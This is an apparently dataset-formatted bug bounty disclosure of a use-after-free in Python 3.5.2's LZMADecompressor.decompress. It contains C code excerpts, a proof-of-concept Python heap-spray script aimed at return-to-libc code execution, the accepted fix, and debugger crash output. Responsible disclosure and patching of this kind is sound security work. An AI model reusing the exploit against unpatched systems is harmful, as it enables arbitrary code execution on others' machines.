{
  "reported_to": "Internet Bug Bounty",
  "reported_by": "johnleitch ",
  "title": "LZMADecompressor.decompress Use After Free",
  "content": "\nI have submitted a vulnerability that has now been fixed. The report includes a proof of concept that demonstrates code execution. The submitted patch was accepted with minor changes.\nhttps://bugs.python.org/issue28275\n\nPython 3.5.2 suffers from a use after free vulnerability caused by the behavior of the LZMADecompressor.decompress method. The problem exists due to a dangling pointer created by an incomplete error path in the _lzma!decompress function.\nstatic PyObject\ndecompress(Decompressor d, uint8_t data, size_t len, Py_ssize_t max_length)\n{\nchar input_buffer_in_use;\nPyObject result;\nlzma_stream *lzs = &d->lzs;\n/ Prepend unconsumed input if necessary /\nif (lzs->next_in != NULL) {\n[...]\n}\nelse {\nlzs->next_in = data;\nlzs->avail_in = len;\ninput_buffer_in_use = 0;\n}\nresult = decompress_buf(d, max_length);\nif(result == NULL)\nreturn NULL;\n[...]\n}\nWhen the function is first called, lzs->next_in is NULL, so it is set using the data argument. If the subsequent call to decompress_buf fails because the stream is malformed, the function returns while maintaining the current value for lzs->next_in.\nA couple returns later, the allocation pointed to by lzs->next_in (data) is freed:\nstatic PyObject\n_lzma_LZMADecompressor_decompress(Decompressor self, PyObject args, PyObject kwargs)\n{\nPyObject return_value = NULL;\nstatic char _keywords[] = {\"data\", \"max_length\", NULL};\nPy_buffer data = {NULL, NULL};\nPy_ssize_t max_length = -1;\nif (!PyArg_ParseTupleAndKeywords(args, kwargs, \"y*|n:decompress\", _keywords,\n&data, &max_length))\ngoto exit;\nreturn_value = _lzma_LZMADecompressor_decompress_impl(self, &data, max_length);\nexit:\n/ Cleanup for data /\nif (data.obj)\nPyBuffer_Release(&data);\nreturn return_value;\n}\nAt this point, any calls to decompress made to the same Decompressor instance (a typical use case--multiple calls may be necessary to decompress a single stream) will result in a memcpy to the dangling lzs->next_in pointer, and thus memory corruption.\nstatic PyObject\ndecompress(Decompressor d, uint8_t data, size_t len, Py_ssize_t max_length)\n{\nchar input_buffer_in_use;\nPyObject result;\nlzma_stream *lzs = &d->lzs;\n/ Prepend unconsumed input if necessary /\nif (lzs->next_in != NULL) {\nsize_t avail_now, avail_total;\n[...]\nmemcpy((void*)(lzs->next_in + lzs->avail_in), data, len);\nlzs->avail_in += len;\ninput_buffer_in_use = 1;\n}\nelse {\n[...]\n}\n}\nThis vulnerability can be exploited to achieve arbitrary code execution. In applications where untrusted LZMA streams are received over a network, it might be possible to exploit this vulnerability remotely. A simple proof of concept that demonstrates a return-to-libc attack is attached.\nimport _lzma\nfrom array import *\nSystem address when tested: 76064070\nd = _lzma.LZMADecompressor()\nspray = [];\nfor x in range(0, 0x700):\nmeg = bytearray(b'\\x76\\x70\\x40\\x06' * int(0x100000 / 4));\n\nspray.append(meg)\ndef foo():\n\nfor x in range(0, 2):\ntry:\nd.decompress(b\"\\x20\\x26\\x20\\x63\\x61\\x6c\\x63\\x00\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\" int(0x100 / (44)))\nexcept:\npass\nfoo()\nprint(len(spray[0]))\nprint(len(spray))\nTo fix the issue, it is recommended that lzs->next_in be zeroed in the event the call to decompress_buf fails. A proposed patch is attached.\nresult = decompress_buf(d, max_length);\nif(result == NULL) {\nlzs->next_in = 0;\nreturn NULL;\n}\nA repro file is attached as well.\nException details:\n0:000> r\neax=0000000a ebx=009ef540 ecx=00000002 edx=41414141 esi=08b44970 edi=09275fe8\neip=6bf55149 esp=009ef3e0 ebp=009ef434 iopl=0 nv up ei pl nz na po cy\ncs=0023 ss=002b ds=002b es=002b fs=0053 gs=002b efl=00010203\nVCRUNTIME140D!TrailingDownVec+0x1f9:\n6bf55149 8917 mov dword ptr [edi],edx ds:002b:09275fe8=????????\n0:000> k\nChildEBP RetAddr\n\n009ef3e4 5d573f80 VCRUNTIME140D!TrailingDownVec+0x1f9 [f:\\dd\\vctools\\crt\\vcruntime\\src\\string\\i386\\memcpy.asm @ 658]\n009ef434 5d573383 _lzma_d!decompress+0x130 [c:\\source2\\python-3.5.2\\modules_lzmamodule.c @ 997]\n009ef454 5d572049 _lzma_d!_lzma_LZMADecompressor_decompress_impl+0x93 [c:\\source2\\python-3.5.2\\modules_lzmamodule.c @ 1097]\n009ef49c 55e6dd40 _lzma_d!_lzma_LZMADecompressor_decompress+0x79 [c:\\source2\\python-3.5.2\\modules\\clinic_lzmamodule.c.h @ 99]\n009ef4d4 55f65199 python35_d!PyCFunction_Call+0x80 [c:\\source2\\python-3.5.2\\objects\\methodobject.c @ 98]\n009ef4fc 55f6008d python35_d!call_function+0x3e9 [c:\\source2\\python-3.5.2\\python\\ceval.c @ 4705]\n009ef58c 55f6478d python35_d!PyEval_EvalFrameEx+0x509d [c:\\source2\\python-3.5.2\\python\\ceval.c @ 3238]\n009ef5cc 55f5afbd python35_d!_PyEval_EvalCodeWithName+0x73d [c:\\source2\\python-3.5.2\\python\\ceval.c @ 4018]\n009ef608 55f5af81 python35_d!PyEval_EvalCodeEx+0x2d [c:\\source2\\python-3.5.2\\python\\ceval.c @ 4039]\n009ef63c 55fe67de python35_d!PyEval_EvalCode+0x21 [c:\\source2\\python-3.5.2\\python\\ceval.c @ 777]\n009ef660 55fe2daa python35_d!run_mod+0x3e [c:\\source2\\python-3.5.2\\python\\pythonrun.c @ 976]\n009ef69c 55fe3dac python35_d!PyRun_FileExFlags+0x9a [c:\\source2\\python-3.5.2\\python\\pythonrun.c @ 929]\n009ef730 55fe2c5b python35_d!PyRun_SimpleFileExFlags+0x3ec [c:\\source2\\python-3.5.2\\python\\pythonrun.c @ 396]\n009ef74c 55d39e6d python35_d!PyRun_AnyFileExFlags+0x6b [c:\\source2\\python-3.5.2\\python\\pythonrun.c @ 80]\n009ef7a0 55d38821 python35_d!run_file+0x13d [c:\\source2\\python-3.5.2\\modules\\main.c @ 318]\n009ef908 1c841331 python35_d!Py_Main+0xf01 [c:\\source2\\python-3.5.2\\modules\\main.c @ 768]\n009ef918 1c84178e python_d!wmain+0x11 [c:\\source2\\python-3.5.2\\programs\\python.c @ 14]\n009ef92c 1c8415da python_d!invoke_main+0x1e [f:\\dd\\vctools\\crt\\vcstartup\\src\\startup\\exe_common.inl @ 89]\n009ef984 1c84146d python_d!scrt_common_main_seh+0x15a [f:\\dd\\vctools\\crt\\vcstartup\\src\\startup\\exe_common.inl @ 264]\n009ef98c 1c8417a8 python_d!scrt_common_main+0xd [f:\\dd\\vctools\\crt\\vcstartup\\src\\startup\\exe_common.inl @ 309]\n009ef994 742438f4 python_d!wmainCRTStartup+0x8 [f:\\dd\\vctools\\crt\\vcstartup\\src\\startup\\exe_wmain.cpp @ 17]\n009ef9a8 77545de3 KERNEL32!BaseThreadInitThunk+0x24\n009ef9f0 77545dae ntdll!RtlUserThreadStart+0x2f\n009efa00 00000000 ntdll!_RtlUserThreadStart+0x1b\n0:000> !heap -p -a edi\naddress 09275fe8 found in\n_DPH_HEAP_ROOT @ 53a1000\nin free-ed allocation ( DPH_HEAP_BLOCK: VirtAddr VirtSize)\n9182d68: 9275000 2000\n5c949cd2 verifier!AVrfDebugPageHeapFree+0x000000c2\n775be045 ntdll!RtlDebugFreeHeap+0x0000003c\n7751cc3e ntdll!RtlpFreeHeap+0x00000c3e\n7751b4c8 ntdll!RtlFreeHeap+0x00000268\n591067a7 ucrtbased!free_base+0x00000027\n5910394b ucrtbased!calloc_base+0x00000b5b\n5910617c ucrtbased!free_dbg+0x0000007c\n59106750 ucrtbased!free+0x00000010\n55e781bd python35_d!_PyMem_RawFree+0x0000000d [c:\\source2\\python-3.5.2\\objects\\obmalloc.c @ 90]\n55e77f32 python35_d!_PyMem_DebugFree+0x00000072 [c:\\source2\\python-3.5.2\\objects\\obmalloc.c @ 1892]\n55e78434 python35_d!PyMem_RawFree+0x00000014 [c:\\source2\\python-3.5.2\\objects\\obmalloc.c @ 316]\n55e77ad1 python35_d!_PyObject_Free+0x00000591 [c:\\source2\\python-3.5.2\\objects\\obmalloc.c @ 1618]\n55e77f32 python35_d!_PyMem_DebugFree+0x00000072 [c:\\source2\\python-3.5.2\\objects\\obmalloc.c @ 1892]\n55e78724 python35_d!PyObject_Free+0x00000014 [c:\\source2\\python-3.5.2\\objects\\obmalloc.c @ 410]\n55e02005 python35_d!bytes_dealloc+0x00000015 [c:\\source2\\python-3.5.2\\objects\\bytesobject.c @ 956]\n55e75f73 python35_d!_Py_Dealloc+0x00000023 [c:\\source2\\python-3.5.2\\objects\\object.c @ 1786]\n55e922f7 python35_d!tupledealloc+0x000000c7 [c:\\source2\\python-3.5.2\\objects\\tupleobject.c @ 236]\n55e75f73 python35_d!_Py_Dealloc+0x00000023 [c:\\source2\\python-3.5.2\\objects\\object.c @ 1786]\n55f651a9 python35_d!call_function+0x000003f9 [c:\\source2\\python-3.5.2\\python\\ceval.c @ 4707]\n55f6008d python35_d!PyEval_EvalFrameEx+0x0000509d [c:\\source2\\python-3.5.2\\python\\ceval.c @ 3238]\n55f6478d python35_d!_PyEval_EvalCodeWithName+0x0000073d [c:\\source2\\python-3.5.2\\python\\ceval.c @ 4018]\n55f5afbd python35_d!PyEval_EvalCodeEx+0x0000002d [c:\\source2\\python-3.5.2\\python\\ceval.c @ 4039]\n55f5af81 python35_d!PyEval_EvalCode+0x00000021 [c:\\source2\\python-3.5.2\\python\\ceval.c @ 777]\n55fe67de python35_d!run_mod+0x0000003e [c:\\source2\\python-3.5.2\\python\\pythonrun.c @ 976]\n55fe2daa python35_d!PyRun_FileExFlags+0x0000009a [c:\\source2\\python-3.5.2\\python\\pythonrun.c @ 929]\n55fe3dac python35_d!PyRun_SimpleFileExFlags+0x000003ec [c:\\source2\\python-3.5.2\\python\\pythonrun.c @ 396]\n55fe2c5b python35_d!PyRun_AnyFileExFlags+0x0000006b [c:\\source2\\python-3.5.2\\python\\pythonrun.c @ 80]\n55d39e6d python35_d!run_file+0x0000013d [c:\\source2\\python-3.5.2\\modules\\main.c @ 318]\n55d38821 python35_d!Py_Main+0x00000f01 [c:\\source2\\python-3.5.2\\modules\\main.c @ 768]\n1c841331 python_d!wmain+0x00000011 [c:\\source2\\python-3.5.2\\programs\\python.c @ 14]\n1c84178e python_d!invoke_main+0x0000001e [f:\\dd\\vctools\\crt\\vcstartup\\src\\startup\\exe_common.inl @ 89]\n1c8415da python_d!scrt_common_main_seh+0x0000015a [f:\\dd\\vctools\\crt\\vcstartup\\src\\startup\\exe_common.inl @ 264]\n0:000> !analyze -v -nodb\n\n\n\nException Analysis *\n\n\n\nFAULTING_IP:\nVCRUNTIME140D!TrailingDownVec+1f9 [f:\\dd\\vctools\\crt\\vcruntime\\src\\string\\i386\\memcpy.asm @ 658]\n6bf55149 8917 mov dword ptr [edi],edx\nEXCEPTION_RECORD: ffffffff -- (.exr 0xffffffffffffffff)\nExceptionAddress: 6bf55149 (VCRUNTIME140D!TrailingDownVec+0x000001f9)\nExceptionCode: c0000005 (Access violation)\nExceptionFlags: 00000000\nNumberParameters: 2\nParameter[0]: 00000001\nParameter[1]: 09275fe8\nAttempt to write to address 09275fe8\nCONTEXT: 00000000 -- (.cxr 0x0;r)\neax=0000000a ebx=009ef540 ecx=00000002 edx=41414141 esi=08b44970 edi=09275fe8\neip=6bf55149 esp=009ef3e0 ebp=009ef434 iopl=0 nv up ei pl nz na po cy\ncs=0023 ss=002b ds=002b es=002b fs=0053 gs=002b efl=00010203\nVCRUNTIME140D!TrailingDownVec+0x1f9:\n6bf55149 8917 mov dword ptr [edi],edx ds:002b:09275fe8=????????\nFAULTING_THREAD: 000043fc\nDEFAULT_BUCKET_ID: INVALID_POINTER_WRITE\nPROCESS_NAME: python_d.exe\nERROR_CODE: (NTSTATUS) 0xc0000005 - The instruction at 0x%p referenced memory at 0x%p. The memory could not be %s.\nEXCEPTION_CODE: (NTSTATUS) 0xc0000005 - The instruction at 0x%p referenced memory at 0x%p. The memory could not be %s.\nEXCEPTION_PARAMETER1: 00000001\nEXCEPTION_PARAMETER2: 09275fe8\nWRITE_ADDRESS: 09275fe8\nFOLLOWUP_IP:\nVCRUNTIME140D!TrailingDownVec+1f9 [f:\\dd\\vctools\\crt\\vcruntime\\src\\string\\i386\\memcpy.asm @ 658]\n6bf55149 8917 mov dword ptr [edi],edx\nNTGLOBALFLAG: 2000000\nAPPLICATION_VERIFIER_FLAGS: 0\nAPP: python_d.exe\nANALYSIS_VERSION: 6.3.9600.17029 (debuggers(dbg).140219-1702) x86fre\nPRIMARY_PROBLEM_CLASS: INVALID_POINTER_WRITE\nBUGCHECK_STR: APPLICATION_FAULT_INVALID_POINTER_WRITE_INVALID_POINTER_READ\nLAST_CONTROL_TRANSFER: from 5d573f80 to 6bf55149\nSTACK_TEXT:\n\n009ef3e4 5d573f80 09275fe8 08b44970 0000000a VCRUNTIME140D!TrailingDownVec+0x1f9\n009ef434 5d573383 060e9f40 08b44970 0000000a _lzma_d!decompress+0x130\n009ef454 5d572049 060e9f40 009ef468 ffffffff _lzma_d!_lzma_LZMADecompressor_decompress_impl+0x93\n009ef49c 55e6dd40 060e9f40 079cec40 00000000 _lzma_d!_lzma_LZMADecompressor_decompress+0x79\n009ef4d4 55f65199 08b53db8 079cec40 00000000 python35_d!PyCFunction_Call+0x80\n009ef4fc 55f6008d 009ef540 079cec40 06143c78 python35_d!call_function+0x3e9\n009ef58c 55f6478d 06143c78 00000000 1c84114f python35_d!PyEval_EvalFrameEx+0x509d\n009ef5cc 55f5afbd 079eae60 06143c78 06171978 python35_d!_PyEval_EvalCodeWithName+0x73d\n009ef608 55f5af81 079eae60 06171978 06171978 python35_d!PyEval_EvalCodeEx+0x2d\n009ef63c 55fe67de 079eae60 06171978 06171978 python35_d!PyEval_EvalCode+0x21\n009ef660 55fe2daa 08db1470 08b4b168 06171978 python35_d!run_mod+0x3e\n009ef69c 55fe3dac 06e40fc0 079f30e0 00000101 python35_d!PyRun_FileExFlags+0x9a\n009ef730 55fe2c5b 06e40fc0 079f30e0 00000001 python35_d!PyRun_SimpleFileExFlags+0x3ec\n009ef74c 55d39e6d 06e40fc0 079f30e0 00000001 python35_d!PyRun_AnyFileExFlags+0x6b\n009ef7a0 55d38821 06e40fc0 06012fa6 009ef85c python35_d!run_file+0x13d\n009ef908 1c841331 00000002 06012f80 009ef92c python35_d!Py_Main+0xf01\n009ef918 1c84178e 00000002 06012f80 0601af40 python_d!wmain+0x11\n009ef92c 1c8415da 851961c5 1c84114f 1c84114f python_d!invoke_main+0x1e\n009ef984 1c84146d 009ef994 1c8417a8 009ef9a8 python_d!scrt_common_main_seh+0x15a\n009ef98c 1c8417a8 009ef9a8 742438f4 006cd000 python_d!scrt_common_main+0xd\n009ef994 742438f4 006cd000 742438d0 939c497b python_d!wmainCRTStartup+0x8\n009ef9a8 77545de3 006cd000 5080bb84 00000000 KERNEL32!BaseThreadInitThunk+0x24\n009ef9f0 77545dae ffffffff 7756b7d7 00000000 ntdll!__RtlUserThreadStart+0x2f\n009efa00 00000000 1c84114f 006cd000 00000000 ntdll!_RtlUserThreadStart+0x1b\nSTACK_COMMAND: .cxr 0x0 ; kb\nFAULTING_SOURCE_LINE: f:\\dd\\vctools\\crt\\vcruntime\\src\\string\\i386\\memcpy.asm\nFAULTING_SOURCE_FILE: f:\\dd\\vctools\\crt\\vcruntime\\src\\string\\i386\\memcpy.asm\nFAULTING_SOURCE_LINE_NUMBER: 658\nSYMBOL_STACK_INDEX: 0\nSYMBOL_NAME: vcruntime140d!TrailingDownVec+1f9\nFOLLOWUP_NAME: MachineOwner\nMODULE_NAME: VCRUNTIME140D\nIMAGE_NAME: VCRUNTIME140D.dll\nDEBUG_FLR_IMAGE_TIMESTAMP: 558ce3d5\nFAILURE_BUCKET_ID: INVALID_POINTER_WRITE_c0000005_VCRUNTIME140D.dll!TrailingDownVec\nBUCKET_ID: APPLICATION_FAULT_INVALID_POINTER_WRITE_INVALID_POINTER_READ_vcruntime140d!TrailingDownVec+1f9\nANALYSIS_SOURCE: UM\nFAILURE_ID_HASH_STRING: um:invalid_pointer_write_c0000005_vcruntime140d.dll!trailingdownvec\nFAILURE_ID_HASH: {935a9c66-b210-2678-8c10-c746a999bfb6}\nFollowup: MachineOwner\n\n",
  "severity": [
    9.0,
    10.0
  ],
  "bounty": 1500,
  "weaknesses": [
    "Memory Corruption - Generic"
  ],
  "screenshots": {},
  "disclosed_date": 1480915800,
  "report_url": "https://hackerone.com/reports/172562",
  "is_multi_component": true,
  "complexity": "HIGH",
  "novelty": "MEDIUM",
  "vuln_category": "CODE",
  "steps": [
    [
      1,
      "Create a Python script that initializes an LZMADecompressor object and attempts to decompress malformed LZMA data."
    ],
    [
      2,
      "Observe the crash or unexpected behavior when the decompression fails, indicating a use-after-free vulnerability."
    ]
  ],
  "vuln_description": "The vulnerability is a use-after-free issue in the LZMADecompressor.decompress method in Python 3.5.2. When decompressing malformed LZMA data, the method fails to reset the lzs->next_in pointer, leading to a dangling pointer. Subsequent calls to decompress can then result in memory corruption, potentially allowing arbitrary code execution.",
  "reason": "This vulnerability involves understanding the internal state management of the LZMADecompressor and how it handles malformed data. The attacker needs to recognize the dangling pointer issue and craft a payload that exploits this condition. The interaction between the decompression failure and subsequent memory operations is subtle and non-obvious.",
  "new_complexity": "HIGH",
  "requires_code": true,
  "requires_CVE": false,
  "is_ctf": false,
  "other_report": null
}